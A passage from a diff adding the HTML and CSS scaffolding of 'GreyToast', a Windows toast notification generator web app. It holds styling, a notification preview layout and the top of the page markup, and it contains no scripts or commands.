@@ -1,0 +1,2256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GreyToast</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+/* ── TOKENS ── */
+:root{
+  --bg:#090c12;--panel:#0f1219;--panel2:#151a24;--panel3:#1b2030;
+  --border:#1d2438;--border2:#252d42;--border3:#2e3850;
+  --accent:#7a8faf;--accent-dim:rgba(122,143,175,.13);
+  --accent-hi:#a0b4d0;
+  --text:#cdd4e4;--text2:#8b95ae;--text3:#4a5470;
+  --green:#34d27a;--red:#f0566a;--yellow:#f0b429;--purple:#a78bfa;
+  --radius:7px;--radius-sm:5px;--radius-lg:10px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;overflow:hidden}
+body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;font-size:13px;display:flex;flex-direction:column}
+
+/* ── TOPBAR ── */
+.bar{display:flex;align-items:center;gap:10px;padding:0 14px;height:52px;background:var(--panel);border-bottom:1px solid var(--border);flex-shrink:0;z-index:10;position:relative}
+.bar-logo{display:flex;align-items:center;gap:9px}
+.bar-title-group{display:flex;flex-direction:column;gap:0}
+.bar-name{font-weight:800;font-size:1.25rem;letter-spacing:-.5px;color:var(--text);line-height:1.2}
+.bar-name span{color:var(--accent-hi,#a0b4d0)}
+.bar-desc{font-size:.6rem;color:var(--text3);letter-spacing:.2px}
+.bar-author{font-size:.58rem;color:var(--text3);text-decoration:none;letter-spacing:.1px;transition:color .15s;font-family:'Inter',sans-serif}
+.bar-author:hover{color:var(--accent)}
+.bar-ver{font-family:'JetBrains Mono',monospace;font-size:.55rem;padding:2px 6px;border-radius:8px;background:var(--accent-dim);color:var(--accent);border:1px solid rgba(122,143,175,.25)}
+.bar-spacer{flex:1}
+.bar-btn{font-size:.65rem;font-weight:500;padding:5px 12px;border-radius:var(--radius-sm);border:1px solid var(--border2);background:transparent;color:var(--text2);cursor:pointer;transition:all .15s;text-decoration:none;display:flex;align-items:center;gap:5px;font-family:'Inter',sans-serif;letter-spacing:.1px;white-space:nowrap}
+.bar-btn:hover{border-color:var(--accent);color:var(--accent)}
+.bar-btn.primary{background:var(--accent);color:#fff;border-color:var(--accent);font-weight:600}
+.bar-btn.primary:hover{opacity:.87}
+.bar-gh:hover{border-color:var(--border3);color:var(--text)}
+
+/* ── LAYOUT ── */
+.layout{display:flex;flex:1;overflow:hidden;user-select:none}
+
+/* ── RESIZER ── */
+.resizer{width:4px;flex-shrink:0;background:var(--border);cursor:col-resize;position:relative;z-index:5;transition:background .2s}
+.resizer:hover,.resizer.dragging{background:var(--accent)}
+.resizer::after{content:'';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:2px;height:20px;border-radius:1px;background:inherit}
+
+/* ── SIDEBAR ── */
+.sidebar{width:220px;min-width:140px;max-width:400px;flex-shrink:0;background:var(--panel);display:flex;flex-direction:column;overflow:hidden}
+.sb-top-area{border-bottom:1px solid var(--border);flex-shrink:0}
+.sb-search{padding:8px 8px 6px}
+.sb-search input{width:100%;background:var(--bg);border:1px solid var(--border);border-radius:var(--radius-sm);padding:6px 10px;color:var(--text);font-size:.7rem;outline:none;transition:border-color .15s;font-family:'Inter',sans-serif}
+.sb-search input::placeholder{color:var(--text3)}
+.sb-search input:focus{border-color:var(--accent)}
+.sb-filter-area{padding:5px 8px 6px;display:flex;gap:4px;flex-wrap:wrap}
+.sb-expand-row{display:flex;border-top:1px solid var(--border)}
+.sb-expand-btn{flex:1;padding:4px 0;font-size:.6rem;color:var(--text3);background:transparent;border:none;border-right:1px solid var(--border);cursor:pointer;transition:color .12s;font-family:'Inter',sans-serif}
+.sb-expand-btn:last-child{border-right:none}
+.sb-expand-btn:hover{color:var(--text)}
+.sb-list{flex:1;overflow-y:auto}
+.sb-group{padding:5px 10px 4px;font-size:.6rem;font-weight:700;color:var(--text2);text-transform:uppercase;letter-spacing:1px;background:var(--bg);position:sticky;top:0;z-index:2;cursor:pointer;display:flex;align-items:center;justify-content:space-between;user-select:none;transition:color .12s;font-family:'Inter',sans-serif;border-bottom:1px solid var(--border)}
+.sb-group:hover{color:var(--text2)}
+.sb-item{padding:7px 10px 6px;cursor:pointer;transition:background .1s;position:relative;border-bottom:1px solid rgba(29,36,56,.6)}
+.sb-item:hover{background:var(--panel2)}
+.sb-item.active{background:var(--panel2)}
+.sb-item.active::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--accent)}
+.sb-num{font-family:'JetBrains Mono',monospace;font-size:.55rem;color:var(--accent);margin-bottom:2px;font-weight:600}
+.sb-name{font-size:.73rem;font-weight:500;color:var(--text);line-height:1.35}
+.sb-meta{font-size:.62rem;color:var(--text2);margin-top:3px}
+
+/* ── EDITOR CENTER ── */
+.editor{flex:1;display:flex;flex-direction:column;overflow:hidden;background:var(--bg)}
+.ed-tabs{display:flex;background:var(--panel);border-bottom:1px solid var(--border);flex-shrink:0;padding:0 4px}
+.ed-tab{padding:10px 14px;font-size:.7rem;font-weight:500;color:var(--text2);cursor:pointer;border-bottom:2px solid transparent;transition:all .15s;letter-spacing:.1px;font-family:'Inter',sans-serif}
+.ed-tab:hover{color:var(--text);background:rgba(255,255,255,.03)}
+.ed-tab.active{color:var(--accent);border-bottom-color:var(--accent)}
+.ed-body{flex:1;overflow-y:auto;padding:14px 16px;display:flex;flex-direction:column;gap:16px}
+.ed-body.hidden{display:none}
+
+/* ── FORM SECTIONS ── */
+.form-section{display:flex;flex-direction:column;gap:10px}
+.sec-hdr{display:flex;align-items:center;gap:7px;margin-bottom:2px}
+.sec-icon{width:18px;height:18px;border-radius:5px;display:flex;align-items:center;justify-content:center;flex-shrink:0;background:var(--accent-dim)}
+.sec-label{font-size:.66rem;font-weight:700;color:var(--text2);letter-spacing:.4px;text-transform:uppercase}
+.field-group{display:flex;flex-direction:column;gap:9px;padding:12px;background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);user-select:text}
+.field{display:flex;flex-direction:column;gap:4px}
+.field label{font-size:.7rem;font-weight:600;color:var(--text2);letter-spacing:.05px}
+.field input,.field textarea,.field select{background:var(--panel2);border:1px solid var(--border2);border-radius:var(--radius-sm);padding:7px 10px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:.7rem;outline:none;transition:border-color .15s;width:100%;line-height:1.4}
+.field input:focus,.field textarea:focus,.field select:focus{border-color:var(--accent);background:var(--panel3)}
+.field select option{background:var(--panel2)}
+.field textarea{resize:vertical;min-height:54px;line-height:1.55}
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:9px}
+.field-hint{font-size:.62rem;color:var(--text2);margin-top:3px;line-height:1.4}
+
+/* ── PILL TOGGLE ── */
+.pill-row{display:flex;gap:4px;flex-wrap:wrap}
+.pill{font-size:.65rem;font-weight:500;padding:4px 10px;border-radius:10px;border:1px solid var(--border2);background:transparent;color:var(--text2);cursor:pointer;transition:all .12s;font-family:'Inter',sans-serif}
+.pill:hover{color:var(--text);border-color:var(--border3)}
+.pill.on{background:var(--accent-dim);border-color:var(--accent);color:var(--accent);font-weight:600}
+
+/* ── TOGGLE SWITCH ── */
+.toggle-row{display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none}
+.toggle-row span{font-size:.7rem;color:var(--text2)}
+.sw{width:28px;height:15px;border-radius:8px;background:var(--border2);position:relative;transition:background .2s;flex-shrink:0}
+.sw.on{background:var(--accent)}
+.sw::after{content:'';position:absolute;top:2px;left:2px;width:11px;height:11px;border-radius:6px;background:#fff;transition:transform .2s}
+.sw.on::after{transform:translateX(13px)}
+
+/* ── BLOCK (expandable inner section) ── */
+.block{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:11px;display:flex;flex-direction:column;gap:9px;user-select:text}
+.block-title{font-size:.68rem;font-weight:700;color:var(--text);text-transform:none;letter-spacing:0;display:flex;align-items:center;justify-content:space-between}
+
+/* ── XML EDITOR ── */
+.xml-wrap{flex:1;display:flex;flex-direction:column;gap:8px;overflow:hidden}
+.xml-acts{display:flex;gap:5px;flex-wrap:wrap;flex-shrink:0}
+.xml-btn{font-size:.67rem;font-weight:500;padding:5px 11px;border-radius:var(--radius-sm);border:1px solid var(--border2);background:var(--panel);color:var(--text2);cursor:pointer;transition:all .12s;font-family:'Inter',sans-serif}
+.xml-btn:hover{border-color:var(--accent);color:var(--accent)}
+.xml-btn.hi{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}
+.xml-textarea{flex:1;background:#07090f;border:1px solid var(--border);border-radius:var(--radius);padding:12px;font-family:'JetBrains Mono',monospace;font-size:.7rem;color:#9baec8;line-height:1.8;resize:none;outline:none;min-height:300px}
+.xml-textarea:focus{border-color:var(--accent)}
+.xml-msg{font-size:.63rem;padding:5px 9px;border-radius:var(--radius-sm);display:none;font-family:'JetBrains Mono',monospace}
+.xml-msg.ok{display:block;background:rgba(52,210,122,.07);color:var(--green);border:1px solid rgba(52,210,122,.2)}
+.xml-msg.err{display:block;background:rgba(240,86,106,.07);color:var(--red);border:1px solid rgba(240,86,106,.2)}
+.xml-msg.warn{display:block;background:rgba(240,180,41,.07);color:var(--yellow);border:1px solid rgba(240,180,41,.2)}
+
+/* ── RIGHT PANEL ── */
+.right{width:320px;min-width:200px;max-width:500px;flex-shrink:0;background:var(--panel);display:flex;flex-direction:column;overflow:hidden}
+.right-hdr{padding:9px 14px;border-bottom:1px solid var(--border);font-size:.7rem;font-weight:700;color:var(--text);text-transform:uppercase;letter-spacing:.5px;flex-shrink:0;display:flex;align-items:center;gap:6px}
+
+/* ── WIN11 TOAST PREVIEW ── */
+.win-notif-area{background:#141416;border-radius:var(--radius);padding:10px;border:1px solid #222224}
+.win-notif-area-label{font-size:.58rem;font-weight:600;color:var(--text2);margin-bottom:7px;text-transform:uppercase;letter-spacing:1px;font-family:'Inter',sans-serif}
+.toast-w11{background:#2b2b2d;border-radius:var(--radius-sm);overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,.6);font-family:'Segoe UI Variable Text','Segoe UI',sans-serif;position:relative}
+.toast-w11-bar{height:3px;width:100%;opacity:.8}
+.toast-w11-inner{padding:11px 13px 9px}
+.tw-approw{display:flex;align-items:center;gap:6px;margin-bottom:7px}
+.tw-appicon{width:16px;height:16px;border-radius:4px;flex-shrink:0;overflow:hidden;display:flex;align-items:center;justify-content:center}
+.tw-appname{font-size:.6rem;font-weight:600;color:#adadad;flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.tw-time{font-size:.56rem;color:#5a5a5a;white-space:nowrap}
+.tw-close{font-size:.65rem;color:#5a5a5a;cursor:default;padding:0 2px}
+.tw-title{font-size:.8rem;font-weight:600;color:#f0f0f0;line-height:1.3;margin-bottom:3px;word-break:break-word}
+.tw-body{font-size:.7rem;color:#adadad;line-height:1.45;word-break:break-word;white-space:pre-wrap}
+.tw-attribution{font-size:.6rem;color:#5a5a5a;margin-top:3px}
+.tw-input{display:flex;align-items:center;gap:6px;margin-top:8px;background:#1e1e20;border:1px solid #3a3a3c;border-radius:4px;padding:5px 8px}
+.tw-input-text{flex:1;font-size:.66rem;color:#5a5a5a;font-style:italic}
+.tw-input-send{font-size:.58rem;color:var(--accent);font-weight:700}
+.tw-select{display:flex;align-items:center;justify-content:space-between;margin-top:8px;background:#1e1e20;border:1px solid #3a3a3c;border-radius:4px;padding:5px 9px}
+.tw-select-val{font-size:.68rem;color:#e0e0e0}
+.tw-select-arrow{font-size:.62rem;color:#5a5a5a}
+.tw-buttons{display:flex;border-top:1px solid #333336;margin-top:9px}
+.tw-btn{flex:1;padding:7px 5px;font-size:.7rem;font-weight:500;color:#d8d8d8;cursor:default;text-align:center;border:none;background:transparent;line-height:1.2;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.tw-btn:not(:last-child){border-right:1px solid #333336}
+.tw-btn:first-child{color:#5b9cf6;font-weight:600}
+.tw-call-btns{display:flex;gap:8px;padding:9px 13px;background:#1e1e20;border-top:1px solid #333336}
+.tw-call-btn{flex:1;padding:7px;border-radius:5px;font-size:.7rem;font-weight:600;cursor:default;text-align:center}
+.tw-call-btn.answer{background:#1e4d38;color:#4ecca0}
+.tw-call-btn.decline{background:#4d1e26;color:#f08090}
+.tw-avatar{width:40px;height:40px;border-radius:50%;background:linear-gradient(135deg,#2e3a7a,#5a2e7a);flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:1rem;color:#fff;font-weight:700}
+.tw-call-body{display:flex;gap:11px;padding:11px 13px 8px;align-items:center}
+.tw-call-info{flex:1;min-width:0}
+.toast-w11.is-urgent .toast-w11-bar{background:var(--red)}
+.toast-w11.is-incoming .toast-w11-bar{background:var(--green)}
+.toast-w11.is-urgent .tw-btn:first-child{color:#f0566a}
+
+/* ── PS OUTPUT ── */
+.out-section{display:flex;flex-direction:column;flex:1;min-height:0;overflow:hidden}
+.out-hdr{display:flex;align-items:center;justify-content:space-between;padding:7px 10px 7px 12px;background:var(--panel2);border-bottom:1px solid var(--border);flex-shrink:0}
+.out-label{font-size:.67rem;font-weight:700;color:var(--text);display:flex;align-items:center;gap:6px;text-transform:uppercase;letter-spacing:.4px}
+.out-actions{display:flex;align-items:center;gap:4px}
+.out-font-btn{font-size:.6rem;font-weight:700;width:22px;height:22px;display:flex;align-items:center;justify-content:center;border-radius:4px;border:1px solid var(--border2);background:transparent;color:var(--text2);cursor:pointer;transition:all .12s;font-family:'JetBrains Mono',monospace;line-height:1}
+.out-font-btn:hover{border-color:var(--accent);color:var(--accent)}
+.out-copy-btn{font-size:.65rem;font-weight:600;padding:4px 10px;border-radius:4px;border:1px solid var(--accent);background:var(--accent-dim);color:var(--accent);cursor:pointer;transition:all .12s;display:flex;align-items:center;gap:4px;font-family:'Inter',sans-serif}
+.out-copy-btn:hover{background:rgba(122,143,175,.22)}
+.out-copy-btn.ok{border-color:var(--green);background:rgba(52,210,122,.1);color:var(--green)}
+pre.ps-out{flex:1;min-height:0;background:#06080e;border:1px solid var(--border);border-top:none;border-radius:0 0 var(--radius) var(--radius);padding:10px 12px;font-family:'JetBrains Mono',monospace;font-size:var(--ps-font,0.65rem);line-height:1.75;overflow-y:auto;overflow-x:hidden;white-space:pre-wrap;word-break:break-all;margin:0;tab-size:2}
+
+/* ── PS SYNTAX COLORS ── */
+.ps-c{color:#3d5068;font-style:italic}   /* comment */
+.ps-kw{color:#c792ea}                    /* keyword: Add-Type, New-Object, function, param */
+.ps-var{color:#82aaff}                   /* $variable */
+.ps-str{color:#c3e88d}                   /* "string" */
+.ps-type{color:#ffcb6b}                  /* [Windows.UI...] type */
+.ps-num{color:#f78c6c}                   /* numbers */
+.ps-xml-tag{color:#89ddf0}              /* <toast> xml tags */
+.ps-xml-attr{color:#82aaff}             /* xml attributes */
+.ps-xml-str{color:#c3e88d}              /* xml attribute values */
+.ps-cmd{color:#89ddf0}                  /* cmdlet names */
+.ps-op{color:#89ddff}                   /* operators */
+
+/* ── GEN BUTTONS ── */
+.gen-area{padding:10px 12px;border-top:1px solid var(--border);flex-shrink:0;background:var(--panel)}
+.g-btn{padding:9px 12px;border-radius:var(--radius);border:none;cursor:pointer;font-size:.73rem;font-weight:600;transition:all .15s;display:flex;align-items:center;justify-content:center;gap:6px;font-family:'Inter',sans-serif;letter-spacing:.1px}
+.g-btn.main{background:var(--accent);color:#fff;box-shadow:0 2px 8px rgba(122,143,175,.3)}
+.g-btn.main:hover{opacity:.88;transform:translateY(-1px)}
+.g-btn.sec{background:var(--panel2);color:var(--text2);border:1px solid var(--border2)}
+.g-btn.sec:hover{border-color:var(--accent);color:var(--accent)}
+
+/* ── MODALS ── */
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);backdrop-filter:blur(4px);z-index:100;display:flex;align-items:center;justify-content:center;opacity:0;pointer-events:none;transition:opacity .2s}
+.overlay.show{opacity:1;pointer-events:all}
+.modal{background:var(--panel);border:1px solid var(--border2);border-radius:var(--radius-lg);padding:20px;width:370px;max-width:92vw;box-shadow:0 20px 60px rgba(0,0,0,.7)}
+.modal h2{font-size:.92rem;font-weight:800;margin-bottom:3px;letter-spacing:-.2px}
+.modal-sub{font-size:.67rem;color:var(--text2);margin-bottom:14px}
+.modal .field{margin-bottom:10px}
+.modal .field label{font-size:.68rem;font-weight:600;color:var(--text2);display:block;margin-bottom:5px}
+.modal-preview{font-family:'JetBrains Mono',monospace;font-size:.62rem;color:var(--green);background:rgba(52,210,122,.06);border:1px solid rgba(52,210,122,.15);border-radius:var(--radius-sm);padding:5px 9px;word-break:break-all;margin-bottom:10px}
+.modal-opt{display:flex;align-items:center;gap:8px;font-size:.72rem;color:var(--text2);cursor:pointer;user-select:none;margin-bottom:4px}
+.modal-btns{display:flex;gap:8px;margin-top:14px}
+.m-btn{flex:1;padding:9px;border-radius:var(--radius-sm);border:none;cursor:pointer;font-size:.75rem;font-weight:600;transition:all .15s;font-family:'Inter',sans-serif}
+.m-btn.cancel{background:var(--panel2);color:var(--text2);border:1px solid var(--border2)}
+.m-btn.cancel:hover{color:var(--text)}
+.m-btn.confirm{background:var(--accent);color:#fff}
+.m-btn.confirm:hover{opacity:.85}
+
+/* ── FEEDBACK TOAST ── */
+.feedback{position:fixed;bottom:16px;right:16px;background:var(--panel);border:1px solid var(--green);border-radius:var(--radius);padding:8px 14px;font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--green);z-index:200;transform:translateY(50px);opacity:0;transition:all .25s;pointer-events:none;max-width:300px}
+.feedback.show{transform:none;opacity:1}
+.feedback.err{border-color:var(--red);color:var(--red)}
+
+/* ── SCROLLBARS ── */
+::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+::-webkit-scrollbar-thumb:hover{background:var(--border3)}
+
+/* ═══════════════════════════════════════════════
+   MOBILE LAYOUT — ≤768px
+   Bottom tab nav, full-screen panels
+═══════════════════════════════════════════════ */
+@media (max-width: 768px) {
+
+  /* Body needs to scroll within panels, not be locked */
+  html, body { overflow: hidden; height: 100%; }
+
+  /* Topbar: taller on mobile for bigger branding */
+  .bar { height: 58px; padding: 0 14px; gap: 10px; }
+  .bar-desc { display: block; font-size: .62rem; }
+  .bar-name { font-size: 1.35rem; letter-spacing: -.5px; }
+  .bar-author { font-size: .52rem; opacity: .8; margin-top: 5px; }
+  .bar-logo svg { width: 40px; height: 40px; }
+  /* Hide all topbar buttons except ⚙ Advanced and hamburger */
+  .bar-gh, .bar-btn:not(.mob-keep) { display: none; }
+
+  /* Layout: single column, hide resizers */
+  .layout { flex-direction: column; overflow: hidden; }
+  .resizer { display: none !important; }
+
+  /* All panels fill the screen, only one shown at a time */
+  .sidebar, .editor, .right {
+    position: absolute;
+    inset: 58px 0 52px 0;   /* topbar=58 + bottom nav=52 */
+    width: 100% !important;
+    max-width: 100% !important;
+    min-width: 0 !important;
+    display: none;
+    flex-direction: column;
+    overflow: hidden;
+    z-index: 1;
+  }
+
+  /* Active panel shown */
+  .mob-panel-active { display: flex !important; }
+
+  /* Editor tab area: larger touch targets */
+  .ed-tab { padding: 10px 18px; font-size: .75rem; }
+
+  /* Form editor: more padding for fingers */
+  .ed-body { padding: 12px 14px 88px; gap: 14px; } /* 88px = fixed bar + gap */
+
+  /* Field inputs: bigger hit area */
+  .field input, .field textarea, .field select {
+    padding: 10px 12px;
+    font-size: .82rem;
+  }
+  .field label { font-size: .76rem; }
+
+  /* Pills: bigger touch targets */
+  .pill { padding: 7px 14px; font-size: .72rem; }
+
+  /* Block sections */
+  .block { padding: 13px; }
+
+  /* Sidebar list: bigger items */
+  .sb-item { padding: 10px 12px; }
+  .sb-name { font-size: .8rem; }
+  .sb-meta { font-size: .68rem; }
+
+  /* Right panel: preview + output stacked */
+  .right { overflow-y: auto; }
+  .out-section { min-height: 220px; }
+  pre.ps-out { max-height: 220px; font-size: .76rem !important; }
+
+  /* Gen area: bigger buttons */
+  .gen-area { padding: 10px; }
+  .g-btn { padding: 14px; font-size: .88rem; }
+
+  /* Bottom tab navigation */
+  .mob-nav {
+    position: fixed;
+    bottom: 0; left: 0; right: 0;
+    height: 52px;
+    background: var(--panel);
+    border-top: 1px solid var(--border);
+    display: flex;
+    z-index: 50;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .mob-tab {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 2px;
+    cursor: pointer;
+    border: none;
+    background: transparent;
+    color: var(--text2);
+    font-size: .56rem;
+    font-family: 'Inter', sans-serif;
+    font-weight: 500;
+    text-transform: uppercase;
+    letter-spacing: .5px;
+    transition: color .15s;
+    -webkit-tap-highlight-color: transparent;
+    padding: 0;
+  }
+  .mob-tab svg { opacity: .6; transition: opacity .15s; }
+  .mob-tab.active { color: var(--accent); }
+  .mob-tab.active svg { opacity: 1; }
+  .mob-tab-dot {
+    width: 4px; height: 4px; border-radius: 2px;
+    background: var(--accent);
+    opacity: 0; transition: opacity .15s;
+    margin-top: 1px;
+  }
+  .mob-tab.active .mob-tab-dot { opacity: 1; }
+
+  /* Output header: wrap if needed */
+  .out-hdr { flex-wrap: wrap; gap: 6px; padding: 8px 10px; }
+  .out-actions { gap: 6px; }
+  .out-font-btn { width: 26px; height: 26px; }
+
+  /* Filter chips: scrollable row */
+  #payloadFilters > div { overflow-x: auto; flex-wrap: nowrap !important; }
+
+  /* Modal: full width on mobile */
+  .modal { width: 94vw !important; padding: 16px; }
+
+  /* XML editor textarea */
+  .xml-textarea { min-height: 200px; font-size: .72rem; }
+
+  /* Feedback toast: above bottom nav */
+  .feedback { bottom: 64px; }
+
+  /* Sidebar search: bigger */
+  .sb-search input { padding: 8px 11px; font-size: .75rem; }
+
+  /* Advanced button: always visible on mobile */
+  .bar-btn-adv { display: flex !important; }
+
+  /* Sidebar group headers: bigger on mobile */
+  .sb-group {
+    padding: 10px 14px 9px;
+    font-size: .7rem;
+    letter-spacing: .5px;
+  }
+
+  /* Sidebar items: bigger on mobile */
+  .sb-item { padding: 11px 14px 10px; }
+  .sb-name  { font-size: .82rem; }
+  .sb-meta  { font-size: .7rem; margin-top: 4px; }
+  .sb-num   { font-size: .62rem; margin-bottom: 3px; }
+
+  /* Mobile breadcrumb nav */
+  .mob-crumb {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 8px 12px;
+    background: var(--panel2);
+    border-bottom: 1px solid var(--border);
+    flex-shrink: 0;
+  }
+  .mob-crumb-back {
+    display: flex;
+    align-items: center;
+    gap: 4px;
+    font-size: .72rem;
+    font-weight: 600;
+    color: var(--accent);
+    background: transparent;
+    border: none;
+    cursor: pointer;
+    font-family: 'Inter', sans-serif;
+    padding: 4px 0;
+    white-space: nowrap;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .mob-crumb-label {
+    flex: 1;
+    font-size: .68rem;
+    font-weight: 600;
+    color: var(--text2);
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    text-align: right;
+  }
+
+  /* Footer: compact on mobile */
+  body > div[style*='border-top'][style*='flex-shrink:0'] {
+    padding: 5px 12px;
+    flex-wrap: wrap;
+    gap: 4px;
+    font-size: .55rem;
+  }
+  body > div[style*='border-top'][style*='flex-shrink:0'] span,
+  body > div[style*='border-top'][style*='flex-shrink:0'] a,
+  body > div[style*='border-top'][style*='flex-shrink:0'] button {
+    font-size: .55rem !important;
+  }
+
+  /* Mobile editor action bar */
+  .mob-editor-bar {
+    position: fixed;
+    bottom: 52px;        /* sit above the bottom nav */
+    left: 0; right: 0;
+    display: flex;
+    gap: 8px;
+    padding: 10px 12px;
+    background: var(--panel);
+    border-top: 1px solid var(--border);
+    z-index: 20;
+    box-shadow: 0 -4px 16px rgba(0,0,0,.3);
+  }
+  .mob-action-btn {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    padding: 11px 8px;
+    border-radius: var(--radius);
+    border: 1px solid var(--border2);
+    background: var(--panel2);
+    color: var(--text2);
+    font-size: .75rem;
+    font-weight: 600;
+    font-family: 'Inter', sans-serif;
+    cursor: pointer;
+    transition: all .15s;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .mob-action-copy {
+    background: var(--accent-dim);
+    border-color: rgba(122,143,175,.3);
+    color: var(--accent);
+  }
+  .mob-action-preview {
+    background: var(--panel2);
+    border-color: var(--border2);
+    color: var(--text);
+  }
+
+  /* Also add a back button at top of preview panel */
+  .mob-back-bar {
+    display: flex;
+    align-items: center;
+    padding: 8px 12px;
+    background: var(--panel);
+    border-bottom: 1px solid var(--border);
+    flex-shrink: 0;
+    gap: 8px;
+    /* stays in flow at top of right panel — fine */
+  }
+  .mob-back-btn {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    font-size: .7rem;
+    font-weight: 600;
+    color: var(--accent);
+    background: transparent;
+    border: none;
+    cursor: pointer;
+    font-family: 'Inter', sans-serif;
+    padding: 4px 0;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .mob-back-label {
+    font-size: .7rem;
+    font-weight: 600;
+    color: var(--text2);
+    flex: 1;
+    text-align: center;
+  }
+
+}
+
+/* Hide mob-only elements on desktop */
+.mob-editor-bar { display: none; }
+.mob-back-bar   { display: none; }
+.mob-crumb      { display: none; }
+
+/* Hide mobile nav on desktop */
+.mob-nav { display: none; }
+
+</style>
+</head>
+<body>
+
+<!-- TOP BAR -->
+<div class="bar">
+  <div class="bar-logo">
+    <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <!-- card shadow -->
+      <rect x="4" y="7" width="24" height="18" rx="4" fill="#0d1018" opacity=".6"/>
+      <!-- notification card body -->
+      <rect x="3" y="5" width="24" height="18" rx="4" fill="#1c2132" stroke="#3a4258" stroke-width=".8"/>
+      <!-- left accent stripe — warm slate -->
+      <rect x="3" y="5" width="3.5" height="18" rx="3" fill="#5a6480"/>
+      <!-- app icon dot -->
+      <rect x="10" y="9" width="4" height="4" rx="1.5" fill="#3a4258"/>
+      <rect x="10" y="9" width="4" height="4" rx="1.5" fill="#8090b0" opacity=".4"/>
+      <!-- title line -->
+      <rect x="16" y="9.5" width="8" height="1.8" rx=".9" fill="#6b7a9f"/>
+      <!-- subtitle line -->
+      <rect x="16" y="12.5" width="5" height="1.4" rx=".7" fill="#3a4258"/>
+      <!-- body line 1 -->
+      <rect x="8" y="16" width="14" height="1.4" rx=".7" fill="#2e3650"/>
+      <!-- body line 2 shorter -->
+      <rect x="8" y="18.5" width="9" height="1.4" rx=".7" fill="#2e3650"/>
+      <!-- top gloss -->
+      <rect x="3" y="5" width="24" height="2" rx="2" fill="white" opacity=".04"/>
+    </svg>
+    <div class="bar-title-group">
+      <div style="display:flex;align-items:flex-start;gap:5px">
+        <div class="bar-name">Grey<span>Toast</span></div>
+        <a href="https://github.com/zer0lightning" target="_blank" class="bar-author" style="font-size:.52rem;color:var(--text3);text-decoration:none;margin-top:4px;letter-spacing:.1px;line-height:1;font-family:'Inter',sans-serif">by zer0Lightning</a>
+      </div>
+      <div class="bar-desc">Windows Toast Notification Generator</div>
+    </div>
+  </div>
+  <div class="bar-spacer"></div>
+  <a href="https://github.com/zer0lightning/greytoast" target="_blank" class="bar-btn bar-gh" title="View on GitHub">
+    <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.418 2.865 8.166 6.839 9.489.5.092.682-.217.682-.482 0-.237-.009-.868-.013-1.703-2.782.604-3.369-1.34-3.369-1.34-.454-1.156-1.11-1.464-1.11-1.464-.908-.62.069-.608.069-.608 1.003.07 1.531 1.03 1.531 1.03.892 1.529 2.341 1.087 2.91.831.092-.646.35-1.086.636-1.336-2.22-.253-4.555-1.11-4.555-4.943 0-1.091.39-1.984 1.029-2.683-.103-.253-.446-1.27.098-2.647 0 0 .84-.269 2.75 1.025A9.578 9.578 0 0112 6.836c.85.004 1.705.114 2.504.336 1.909-1.294 2.747-1.025 2.747-1.025.546 1.377.203 2.394.1 2.647.64.699 1.028 1.592 1.028 2.683 0 3.842-2.339 4.687-4.566 4.935.359.309.678.919.678 1.852 0 1.336-.012 2.415-.012 2.743 0 .267.18.578.688.48C19.138 20.163 22 16.418 22 12c0-5.523-4.477-10-10-10z"/></svg>
+    GitHub
+  </a>
+  <button class="bar-btn" onclick="showAbout()">About</button>
+  <button class="bar-btn" onclick="showAdvanced()">⚙ Advanced</button>
+  <button class="bar-btn" style="color:var(--red);border-color:rgba(247,95,107,.3)" onclick="resetPage()" title="Clear all custom scenarios and reset to defaults">↺ Reset</button>
+</div>
+
+<!-- MAIN LAYOUT -->
+<div class="layout">
+
+  <!-- SIDEBAR -->
+  <div class="sidebar" id="panelLeft">
+    <div class="sb-top-area">
+    <div class="sb-search">
+      <input type="text" id="sbSearch" placeholder="Search by name, app, technique…" oninput="renderSidebar(this.value)">
+    </div>
+      <div id="payloadFilters" class="sb-filter-area"></div>
+      <div class="sb-expand-row">
+        <button class="sb-expand-btn" onclick="expandAll()">Expand All</button>
+        <button class="sb-expand-btn" onclick="collapseAll()">Collapse All</button>
+      </div>
+    </div>
+    <div class="sb-list" id="sbList"></div>
+  </div>
+
+  <div class="resizer" id="resizerLeft" title="Drag to resize · Double-click to reset" aria-label="Resize left panel"></div>
+
+  <!-- EDITOR -->
+  <div class="editor" id="panelCenter">
+    <!-- MOBILE: breadcrumb nav bar -->
+    <div class="mob-crumb" id="mobCrumb">
